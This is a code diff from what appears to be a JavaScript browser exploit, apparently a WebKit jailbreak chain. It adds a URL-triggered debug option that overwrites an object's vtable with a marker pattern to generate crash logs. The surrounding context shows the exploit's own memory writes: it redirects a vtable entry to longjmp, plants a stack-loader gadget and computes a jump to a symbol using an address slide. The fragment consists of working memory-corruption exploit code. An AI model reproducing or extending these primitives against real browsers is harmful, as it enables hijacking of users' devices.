@@ -545,6 +545,25 @@
         }
         var jmpAddr = Add(psyms["genesis"], shslide);
         //print(`finna jmp ${jmpAddr}`)
+		
+		// hopefully we get better crash logs for the i7+ bug with this
+		// gets the GET parameter debug_with_vtab_smash
+		var params = location.search.substr(1).split("&");
+		for (var index = 0; index < params.length; index++) {
+			    param = params[index].split("=");
+				if (param[0] == "debug_with_vtab_smash") {
+					alert("You are running a debug feature, which will cause instability, if you weren't instructed to do so, please stop using it!");
+					var max_smash = parseInt(decodeURIComponent(param[1]));
+					if (isNaN(max_smash)) {
+						throw "w00t I said ints...";
+					}
+					smash_int = new Int64("0x4241414141414141");
+					for (let i = 0; i < max_smash;i += 8) {
+						memory.writeInt64(Add(vtab,i), Add(smash_int,i));
+					}
+					alert("Smashed vtab! Pls get the newest crash log and show it to us");
+				}
+		}
 
         memory.writeInt64(Add(vtab, 0x18), longjmp);
         memory.writeInt64(Add(el_addr, 0x58), stackloader);        // x30 (gadget)
